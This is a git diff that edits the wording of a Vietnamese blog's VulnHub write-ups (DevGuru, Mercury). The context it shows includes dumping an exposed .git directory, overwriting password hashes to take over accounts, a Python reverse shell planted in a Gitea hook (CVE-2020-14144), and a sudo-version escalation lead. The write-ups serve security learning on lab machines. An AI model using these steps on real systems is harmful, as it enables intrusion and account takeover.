@@ -402,7 +402,7 @@ PORT     STATE SERVICE
 8585&#x2F;tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Ở đây có 3 cổng, với 2 cổng quen thuộc là 22-SSH và 80-HTTP, cổng 8585 chạy gì đó chưa biết, mò xem nó chạy cái quần què gì nào.</p>
+<p>Ở đây có 3 cổng, với 2 cổng quen thuộc là 22-SSH và 80-HTTP, cổng 8585 chạy gì đó chưa biết, mò xem nó chạy cái quần què gì.</p>
 <pre class="line-numbers language-none"><code class="language-none">$ nmap -p 22,80,8585 -sV -sC 10.10.10.13
 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-27 21:20 +07
 Nmap scan report for 10.10.10.11
@@ -477,7 +477,7 @@ Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
 Nmap done: 1 IP address (1 host up) scanned in 89.14 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Có thể thấy cổng 8585 đang chạy một dịch vụ HTTP, nhưng tạm thời chưa biết chính xác nó là gì, phiên bản bao nhiêu, biết thế cái đã.<br>Vào thử web trên cổng 8585.<br><img src="pic6.png"><br>Okay, Gitea, nó giống như Github, một nơi lưu trữ source code. Cứ kệ đấy cái đã, giờ vào cái web trên cổng 80 coi mặt mũi nó ra sao.<br><img src="pic1.png"><br>Một trang landing, không có gì nhiều ở đây cả. Liệt kê các thư mục và tệp tin của cái web này ra xem có vẹo gì nữa không.</p>
+<p>Có thể thấy cổng 8585 đang chạy dịch vụ HTTP, nhưng chưa biết chính xác nó là gì, phiên bản bao nhiêu, biết thế cái đã.<br>Vào thử web trên cổng 8585.<br><img src="pic6.png"><br>Okay, Gitea, nó giống như Github, một nơi lưu trữ và quản lý source code. Cứ kệ đấy cái đã, giờ vào cái web trên cổng 80 coi mặt mũi nó ra sao.<br><img src="pic1.png"><br>Một trang landing, không có gì nhiều ở đây cả. Liệt kê các thư mục và tệp tin của cái web này ra xem có vẹo gì nữa không.</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ .&#x2F;dirsearch.py -u http:&#x2F;&#x2F;10.10.10.13&#x2F; -e html,php,txt -x 403
 
   _|. _ _  _  _  _ _|_    v0.4.1
@@ -533,7 +533,7 @@ Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 <blockquote>
 <p><a href="https://vi.wikipedia.org/wiki/Git_(ph%E1%BA%A7n_m%E1%BB%81m)">https://vi.wikipedia.org/wiki/Git_(ph%E1%BA%A7n_m%E1%BB%81m)</a><br>Git (/ɡɪt/, đọc là “Ghít”) là phần mềm quản lý mã nguồn phân tán được phát triển bởi Linus Torvalds vào năm 2005, ban đầu dành cho việc phát triển nhân Linux. Hiện nay, Git trở thành một trong các phần mềm quản lý mã nguồn phổ biến nhất. Git là phần mềm mã nguồn mở được phân phối theo giấy phép công cộng GPL2.</p>
 </blockquote>
-<p>Ờm, đại khái nó là một thứ giúp cho việc quản lý mã nguồn được ngon nghẻ hơn, cái này thì anh em nào làm dev sẽ quá là rõ. Git khiến việc phát triển dự án với nhiều người cùng tham gia dễ dàng hơn, tránh các xung đột không đáng có và rất nhiều lợi ích mà nó đem lại.<br>Và với nhiều lợi ích như thế, <em>git</em> thực sự phổ biến. Nhưng việc sử dụng <em>git</em> một cách hiệu quả và an toàn thì không phải ai cũng nắm được.<br>Khái niệm cơ bản của <em>git</em>, là nó lưu lại tất cả các phiên bản sau mỗi lần thực hiện commit. Điều này là một lợi ích to lớn, vì khi phiên bản mới gặp lỗi và chưa thể khắc phục, nhà phát triển có thể sử dụng phiên bản trước đó đã được lưu trong <em>git</em> để roll back lại. Đây cũng là lí do khiến <em>git</em>, nếu không được cấu hình đúng cách, nó sẽ khiến toàn bộ mã nguồn của dự án bị lộ, hoặc password, private key, thông tin cấu hình… bị đánh cắp.<br>Vậy thì mấy cái xàm xàm mình nói ở trên thì liên quan đéo gì đến bài này. Nhìn lại xem. Cả một đống thông tin liên quan đến <em>git</em> lù lù thế kia, giờ làm cách nào đó để đem nó về máy mình và mổ xẻ, mình hoàn toàn có thể có được mã nguồn của trang này. Thử xem nhé.</p>
+<p>Ờm, đại khái nó là một thứ giúp cho việc quản lý mã nguồn được ngon nghẻ hơn, cái này thì anh em nào làm dev sẽ quá là rõ. Git khiến việc phát triển dự án dễ dàng hơn, đặc biệt khi phát triển theo team, tránh các “xung đột” không đáng có trong code và rất nhiều lợi ích khác mà nó đem lại.<br>Và với nhiều lợi ích như thế, <em>git</em> thực sự phổ biến. Nhưng việc sử dụng <em>git</em> một cách hiệu quả và an toàn thì không phải ai cũng nắm được.<br>Khái niệm cơ bản của <em>git</em>, là nó lưu lại tất cả các phiên bản sau mỗi lần thực hiện commit. Điều này là một lợi ích to lớn, vì khi phiên bản mới gặp lỗi và chưa thể khắc phục, nhà phát triển có thể sử dụng phiên bản trước đó đã được lưu trong <em>git</em> để roll back lại. Đây cũng là lí do khiến <em>git</em>, nếu không được cấu hình đúng cách, nó sẽ khiến toàn bộ mã nguồn từ trước đến nay của dự án bị lộ, hoặc password, private key, thông tin cấu hình… bị đánh cắp.<br>Vậy thì mấy cái xàm xàm tôi nói ở trên thì liên quan đéo gì đến bài này. Nhìn kìa. Cả một đống thông tin liên quan đến <em>git</em> lù lù thế kia, giờ làm cách nào đó để đem nó về máy mình và mổ xẻ, tôi hoàn toàn có thể có được mã nguồn của trang này. Thử xem nhé.</p>
 <h3 id="Git-Dumper"><a href="#Git-Dumper" class="headerlink" title="Git Dumper"></a>Git Dumper</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ .&#x2F;gitdumper.sh  http:&#x2F;&#x2F;10.10.10.13&#x2F;.git&#x2F; ~&#x2F;boot2root&#x2F;devguru
 ###########
 # GitDumper is part of https:&#x2F;&#x2F;github.com&#x2F;internetwache&#x2F;GitTools
@@ -568,14 +568,14 @@ Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><s
 [-] Downloaded: objects&#x2F;4d&#x2F;d5e1d2e02195ac03ed685ac05024f0faef128a
 [-] Downloaded: objects&#x2F;72&#x2F;819740b89eb5f315808c8648d55bd2db369493
 [-] Downloaded: ...bla...bla...bla...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Chống cằm 3 phút cuối cùng nó cũng tải xong một đống thứ lằng nhằng. Cái đống lằng nhằng đấy là gì thì quay lại Google về git thêm nhé :v<br>Vào thư mục mà mình vừa tải một đống thứ kia về, kiểm tra git log, git status các kiểu xem nó hiện ra gì.</p>
+<p>Chống cằm 3 phút cuối cùng nó cũng tải xong một đống thứ lằng nhằng.<br>Vào thư mục mà tôi vừa tải một đống thứ kia về, kiểm tra git log, git status các kiểu xem sao.</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ git log
 commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -&gt; master)
 Author: frank &lt;frank@devguru.local&gt;
 Date:   Thu Nov 19 18:42:03 2020 -0600
 
     first commit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Okay, có mỗi cái <em>first commit</em> thôi, giờ thì checkout nó ra để xem điều bất cmn ngờ.<br>Ở đây mình muốn checkout ra phiên bản mới nhất, nên dùng dấu chấm, còn muốn chọn phiên bản nào để checkout thì copy 7 ký tự đầu của cái hash kia kìa rồi paste vào (<em>VD: git checkout 7de9115</em>)</p>
+<p>Okay, có mỗi cái <em>first commit</em> thôi, giờ thì checkout nó ra để xem điều bất cmn ngờ.<br>Ở đây tôi muốn checkout ra phiên bản mới nhất, nên dùng dấu chấm, còn muốn chọn phiên bản nào để checkout thì copy 7 ký tự đầu của cái hash kia kìa rồi paste vào (<em>VD: git checkout 7de9115</em>)</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ git checkout .
 Updated 2491 paths from the index
 
@@ -597,14 +597,14 @@ drwxr-xr-x 3 ##### #####   4096 Jan  2 20:55 plugins
 -rw-r--r-- 1 ##### #####    551 Jan  2 20:55 server.php
 drwxr-xr-x 6 ##### #####   4096 Jan  2 20:55 storage
 drwxr-xr-x 4 ##### #####   4096 Jan  2 20:55 themes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Ó ò, toàn bộ mã nguồn của cái web này ở đây cả =)) mà cũng quên béng mất cái URL dẫn đến trang login vào cơ sở dữ liệu là <em>adminer.php</em>.<br><img src="pic2.png"><br>Vào xem file cấu hình database lấy username password rồi login vào thôi, ez game.<br>Lúc này, sau khi login thành công vào, thấy có cái bảng liên quan đến backend_users, mặt mũi nó như thế này này.<br><img src="pic3.png"><br>Có thể thấy ngay mật khẩu người dùng được mã hóa sử dụng bcrypt, một dạng hash để phòng tránh việc brute-force. Ùi giời ơi, vào đến đây rồi thì việc đéo gì phải brute-force cho mệt, tạo luôn một cái hash bcrypt với mật khẩu mà mình đã biết rồi chèn thẳng vào là xong à!<br>Để ý mật khẩu của frank đang là:<br><strong>$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</strong><br>Với <strong>$2y$10</strong>, có nghĩa rằng bcrypt ở đây đang có số rounds là 10. EZ!!!<br>Đây là hash của mình với password là <strong>00000</strong>.<br><strong>$2y$10$HiSr8anMnFN/kx1.bKKUe.eHPWNBEetsTVj4aNibZcYu71bcRychm</strong><br>Chèn nó vào ô password, chiếm được tài khoản frank. Sorry Frank =))<br>Login vào /backend nào!<br><img src="pic4.png"><br>Chuyển sang CMS, khá buồn cười là cái Framework này cho phép chỉnh sửa code ngay trên trang quản trị CMS, ở đây có thể upload ảnh ọt, file, chèn code bla bla vân vân mây mây, có một đống cách để có được shell.<br>Sau một hồi ngồi làm quen cú pháp, mình quyết định dùng code để tạo reverse shell.<br><img src="pic5.png"><br>Save lại, và đồng thời phải bật netcat để lắng nghe trên cổng đã đặt trước trong code kia (<em>port 22222</em>). Đoạn code này sẽ được thực thi khi mà page Home được load, vậy nên giờ chỉ cần truy cập vào nó là đã lấy được www-data shell rồi.</p>
+<p>Boom! Toàn bộ mã nguồn của cái web này ở đây cả =)) mà cũng quên béng mất cái URL dẫn đến trang login vào cơ sở dữ liệu là <em>adminer.php</em>.<br><img src="pic2.png"><br>Vào xem file cấu hình database lấy username password rồi login vào thôi, ez game.<br>Lúc này, sau khi login thành công vào, thấy có cái bảng liên quan đến backend_users, mặt mũi nó như thế này này.<br><img src="pic3.png"><br>Có thể thấy ngay mật khẩu người dùng được mã hóa sử dụng bcrypt, một dạng hash để phòng tránh việc brute-force. Ùi giời ơi, vào đến đây rồi thì việc đéo gì phải brute-force cho mệt, tạo luôn một cái hash bcrypt chèn thẳng vào là xong à!<br>Để ý mật khẩu của frank đang là:<br><strong>$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK</strong><br>Với <strong>$2y$10</strong>, có nghĩa rằng bcrypt ở đây đang có số rounds là 10. EZ!!!<br>Đây là hash của tôi với password là <strong>00000</strong>.<br><strong>$2y$10$HiSr8anMnFN/kx1.bKKUe.eHPWNBEetsTVj4aNibZcYu71bcRychm</strong><br>Chèn nó vào ô password, chiếm được tài khoản frank. Sorry Frank =))<br>Login vào /backend nào!<br><img src="pic4.png"><br>Chuyển sang CMS, khá buồn cười là cái Framework này cho phép chỉnh sửa code ngay trên trang quản trị CMS, ở đây có thể upload ảnh ọt, file, chèn code bla bla vân vân mây mây, có một đống cách để có được shell.<br>Sau một hồi ngồi làm quen cú pháp, giờ thì chèn reverse shell vào.<br><img src="pic5.png"><br>Save lại, và đồng thời phải bật netcat để lắng nghe trên cổng đã đặt trước trong code kia (<em>port 22222</em>). Đoạn code này sẽ được thực thi khi mà page Home được load, vậy nên giờ chỉ cần truy cập vào nó là đã lấy được www-data shell rồi.</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nc -nlvp 22222                                                                                 
 listening on [any] 22222 ...
 connect to [10.10.10.1] from (UNKNOWN) [10.10.10.13] 54142
 &#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off
 $ id
 uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Okey, có shell rồi, nhưng chẳng làm được gì nhiều, nhưng ít ra làm được mấy trò hay ho. Xem xem machine này đang có những user nào.</p>
+<p>Okay, có shell rồi, nhưng chẳng làm được gì nhiều, ít ra làm được mấy trò hay ho. Xem xem machine này đang có những user nào.</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ cat &#x2F;etc&#x2F;passwd
 root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
 daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
@@ -670,18 +670,18 @@ PASSWD                                &#x3D; UfFPTF8C8jjxVF2m
 ; Password Hash algorithm, either &quot;argon2&quot;, &quot;pbkdf2&quot;, &quot;scrypt&quot; or &quot;bcrypt&quot;
 PASSWORD_HASH_ALGO                    &#x3D; pbkdf2
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Vậy là có được thông tin đăng nhập vào database, và thông tin liên quan đến thuật toán mã hóa được sử dụng. Database được chạy chung trên cổng 3306 nên mình hoàn toàn có thể sử dụng /adminer để đăng nhập vào.<br>Sau khi đăng nhập, mình thấy có một bảng <em>user</em>, trong đó có tài khoản của frank, với mật khẩu mã hóa kiểu gì éo biết, nhưng ở ngay dưới đó, phần passwd_hash_algo đang có giá trị là pbkdf2. Để chiếm được tài khoản Gitea của frank, lúc này sẽ phải thay đổi passwd với hash là mật khẩu đã biết.<br>Đến đây thì có 2 cách làm:</p>
+<p>Vậy là có được thông tin đăng nhập vào database, và thông tin liên quan đến thuật toán mã hóa được sử dụng. Database được chạy chung trên cổng 3306 nên tôi hoàn toàn có thể sử dụng <em>/adminer</em> để đăng nhập vào.<br>Sau khi đăng nhập, thấy có một bảng <em>user</em>, trong đó có tài khoản của frank, với mật khẩu mã hóa kiểu gì éo biết, nhưng ở ngay dưới đó, phần passwd_hash_algo đang có giá trị là pbkdf2. Để chiếm được tài khoản Gitea của frank, lúc này sẽ phải thay đổi passwd với hash là mật khẩu đã biết.<br>Đến đây thì có 2 cách làm:</p>
 <ul>
 <li>Cách 1: PBKDF2 yêu cầu 5 tham số đầu vào, đó là Password, Salt, Hash function, Iterations count và Key length. Password và Salt thì có thể tùy ý, nhưng 3 cái còn lại thì tuyệt đối đúng. Nên là phải đi tìm :/</li>
-<li>Cách 2: Như thông tin có được trên <em>app.ini.bak</em>, passwd_hash_algo chấp nhận 4 loại hash, trong 4 loại này, quen nhất vẫn là bcrypt. Ơ thế, giờ điền mật khẩu hash là bcrypt và để passwd_hash_algo là bcrypt thì sao nhở.<br>Để thể hiện mình là người thừa thời gian, mình sẽ làm cả 2 cách :D</li>
+<li>Cách 2: Như thông tin có được trên <em>app.ini.bak</em>, passwd_hash_algo chấp nhận 4 loại hash, trong 4 loại này, quen nhất vẫn là bcrypt. Ơ thế, giờ điền mật khẩu hash là bcrypt và để passwd_hash_algo là bcrypt thì sao nhở.<br>Để thể hiện tôi là người thừa thời gian, tôi sẽ làm cả 2 cách :D</li>
 </ul>
-<p>Với cách 1, Google và Google thật nhiều, với từ khóa là <em>pbkdf2 gitea default</em>, mình tìm được:</p>
+<p>Với cách 1, Google và Google thật nhiều, với từ khóa là <em>pbkdf2 gitea default</em>, tôi tìm được:</p>
 <ul>
 <li>Hash function: SHA256</li>
 <li>Iterations count: 10000</li>
 <li>Key length: 50</li>
 </ul>
-<p>Giờ thì dễ rồi, dán cái đống này vào một cái chương trình gen PBKDF2 nào đó, rồi chèn hash vào ô passwd là xong thôi.<br>Thể hiện mình biết python, nên mình sẽ tự code, với password là <strong>00000</strong> và salt là <strong>botcanhHaiChau</strong></p>
+<p>Giờ thì dễ rồi, dán cái đống này vào một cái chương trình gen PBKDF2 nào đó, rồi chèn hash vào ô passwd là xong thôi.<br>Thể hiện là biết python, nên tôi sẽ tự code, với password là <strong>00000</strong> và salt là <strong>botcanhHaiChau</strong></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span> binascii
 <span class="token keyword">from</span> backports<span class="token punctuation">.</span>pbkdf2 <span class="token keyword">import</span> pbkdf2_hmac
 
@@ -692,7 +692,7 @@ key <span class="token operator">=</span> pbkdf2_hmac<span class="token punctuat
 
 <span class="token comment">#7b54b6d699cbf4d2ec3561baf57ebcbfe086e75dbecea8910dade1991eff67c3d139e78ffc26bec1e95b46fbd16a2eeabbf6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><em>Lời nhắn dành cho ai dùng đoạn code trên để làm bài này nhưng vẫn bị sai: Try hard don’t copy!</em></p>
-<p>Với cách 2, nghe chừng dễ dàng và đỡ tốn thời gian hơn cách 1 rất nhiều. Thực ra lần đầu làm bài này mình đã mất cả buổi trưa để đuổi theo cách 1, do không để ý những cấu hình khác trong <em>app.ini.bak</em>. Để thực hiện thì giống hệt với cách đổi mật khẩu của frank trên trang /backend.<br><img src="pic8.png"><br>Với phiên bản Gitea 1.12.5, có một lỗi CVE-2020-14144](<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144</a>) dẫn đến RCE. Nếu có thể khai thác được lỗi này thành công, thì mình hoàn toàn có được shell của thằng user frank trong hệ thống dó Gitea được chạy dưới quyền của frank.<br>Cơ bản, với lỗi CVE này, nó đánh vào quá trình xử lý của hook trên phía server, ơ thế… hook là gì?<br>…<br>Giờ thì tạo một cái Repo mới, sau đó sẽ chèn đoạn mã lấy shell vào 1 trong 3 hook server.<br>Nội dung <em>post-receive</em> lủn củn như thế này:</p>
+<p>Với cách 2, nghe chừng dễ dàng và đỡ tốn thời gian hơn cách 1 rất nhiều. Thực ra lần đầu làm bài này tôi đã mất cả buổi trưa để đuổi theo cách 1, do không để ý những cấu hình khác trong <em>app.ini.bak</em>. Để thực hiện thì giống hệt với cách đổi mật khẩu của frank trên trang /backend.<br><img src="pic8.png"><br>Với phiên bản Gitea 1.12.5, có một lỗi CVE-2020-14144(<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14144</a>) dẫn đến RCE. Nếu có thể khai thác được lỗi này thành công, thì tôi hoàn toàn có được shell của thằng user frank trong hệ thống dó Gitea được chạy dưới quyền của frank.<br>Cơ bản, với lỗi CVE này, nó đánh vào quá trình xử lý của hook trên phía server, ơ thế… hook là gì?<br><em>Read &gt;&gt;&gt; <a href="https://viblo.asia/p/introduction-to-git-hooks-1qm6RWaNGeJE">https://viblo.asia/p/introduction-to-git-hooks-1qm6RWaNGeJE</a></em><br>…<br>Giờ thì tạo một cái Repo mới, sau đó sẽ chèn đoạn mã lấy shell vào 1 trong 3 hook server.<br>Nội dung <em>post-receive</em> lủn củn như thế này:</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
 python3 -c
 <span class="token string">'import socket,subprocess,os;
@@ -703,14 +703,14 @@ os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
 import pty;
 pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Giờ thì chỉ cần tạo một thay đổi nào đó trong cái thư mục Duma vừa mới clone về kia, rồi commit, push lên cho Gitea và có được shell =))</p>
+<p>Tạo một thay đổi nào đó trong cái thư mục Duma vừa mới clone về kia, rồi commit, push lên cho Gitea và có được shell =))</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">nc</span> -nlvp <span class="token number">22224</span>
 listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">22224</span> <span class="token punctuation">..</span>.
 connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.10.1<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.10.13<span class="token punctuation">]</span> <span class="token number">42062</span>
 
 $ <span class="token function">id</span>
 <span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>frank<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>frank<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>frank<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="Get-Root-Shell"><a href="#Get-Root-Shell" class="headerlink" title="Get Root Shell"></a>Get Root Shell</h2><p>Okay, đến màn khó rồi đây.</p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Okay, đến màn khó rồi đây.</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> -l
 Matching Defaults entries <span class="token keyword">for</span> frank on devguru:
     env_reset, mail_badpass,
@@ -721,7 +721,7 @@ User frank may run the following commands on devguru:
 
 $ <span class="token function">uname</span> -a
 Linux devguru.local <span class="token number">4.15</span>.0-124-generic <span class="token comment">#127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Với <em>/usr/bin/sqlite3</em>, có thể lên được Root theo cách này <a href="https://gtfobins.github.io/gtfobins/sqlite3/">https://gtfobins.github.io/gtfobins/sqlite3/</a><br>NHƯNG! <em>(ALL, !root)</em>, cái này ngăn cản root thực hiện, mọi người dùng khác đều được, trừ root :(<br>Sau khi được hint là kiểm tra phiên bản của <em>sudo</em>, wtf, mình chưa bao giờ kiểm tra phiên bản của <em>sudo</em> cả! Trước giờ vẫn nghĩ nó là một phần của hệ thống và được phát triển song song, nên không có phiên bản =))</p>
+<p>Với <em>/usr/bin/sqlite3</em>, có thể lên được Root theo cách này <a href="https://gtfobins.github.io/gtfobins/sqlite3/">https://gtfobins.github.io/gtfobins/sqlite3/</a><br>NHƯNG! <em>(ALL, !root)</em>, cái này ngăn cản root thực hiện, mọi người dùng khác đều được, trừ root :(<br>Sau khi được hint là kiểm tra phiên bản của <em>sudo</em>, wtf, tôi chưa bao giờ kiểm tra phiên bản của <em>sudo</em> cả! Trước giờ vẫn nghĩ nó là một phần của hệ thống và được phát triển song song, nên không có phiên bản =))</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> --version
 Sudo version <span class="token number">1.8</span>.21p2
 Sudoers policy plugin version <span class="token number">1.8</span>.21p2
@@ -763,9 +763,9 @@ sudo: unknown uid <span class="token number">4294967294</span>: <span class="tok
     <title>[VulnHub] Mercury</title>
     <url>/2020/12/26/mercury-vulnhub/</url>
     <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/the-planets-mercury,544/">THE PLANETS: MERCURY</a><br>Difficulty: Easy</p>
-<p>Đây là một machine trên Vulnhub, theo dạng boot2root, khá hay và dễ tiếp cận đối với người mới. Chúng ta sẽ cần phải lấy được 2 flag trong machine này, là user.txt khi lấy được shell đầu tiên, và root.txt khi đã leo quyền thành công.<br>Okay, xem có gì ở đây nào.</p>
+<p>Đây là một machine trên Vulnhub, theo dạng boot2root, yêu cầu của bài là phải lấy được 2 flag trong user.txt và root.txt.<br>Okay, xem có gì ở đây nào.</p>
 <a id="more"></a>
-<h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Go! Xem cái của nợ này đang có địa chỉ IP là gì.</p>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Go! Xem cái của nợ này đang có địa chỉ IP là gì.</p>
 <pre class="line-numbers language-none"><code class="language-none">$ nmap 10.10.10.0&#x2F;24                                                                             
 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-26 21:16 +07
 Nmap scan report for 10.10.10.1
@@ -863,7 +863,7 @@ Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
 Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Nhận được về một đống lằng tằng nhằng, và biết thêm được cổng dịch vụ 22-SSH đang chạy là OpenSSH 8.2p1, cổng 8080 đang chạy web server WSGIServer/0.2 CPython/3.8.2.<br>Truy cập vào <a href="http://10.10.10.10:8080/">http://10.10.10.10:8080</a> để xem mặt mũi cái web server của nó ra sao, nhưng đéo có gì ngoài dòng chữ <strong><em>Hello. This site is currently in development please check back later.</em></strong><br>Chả mới lạ cho lắm, mở xem mã nguồn trang (<em>Ctrl U</em>) cũng không nốt. Giờ thì phải tiếp tục công việc thu thập thông tin bằng cách liệt kê các thư mục/tập tin ẩn trên web server, quét với các công cụ khác để kiếm lỗi CVE,… Công cụ tiếp theo, <strong>nikto</strong> được triệu hồi.</p>
+<p>Nhận được về một đống lằng tằng nhằng, và biết thêm được cổng dịch vụ 22-SSH đang chạy là OpenSSH 8.2p1, cổng 8080 đang chạy http server WSGIServer/0.2 CPython/3.8.2.<br>Truy cập vào <a href="http://10.10.10.10:8080/">http://10.10.10.10:8080</a> để xem mặt mũi cái http server của nó ra sao, nhưng đéo có gì ngoài dòng chữ <strong><em>Hello. This site is currently in development please check back later.</em></strong><br>Chả mới lạ cho lắm, mở xem mã nguồn trang (Ctrl U) cũng không nốt. Giờ thì phải tiếp tục công việc thu thập thông tin bằng cách liệt kê các thư mục/tập tin ẩn trên web server, quét với các công cụ khác để kiếm lỗi CVE,…</p>
 <h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><pre class="line-numbers language-none"><code class="language-none">$ nikto -h http:&#x2F;&#x2F;10.10.10.10:8080                                                               
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -881,7 +881,7 @@ Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds<span aria-hidden="t
 + End Time:           2020-12-26 22:00:59 (GMT7) (61 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
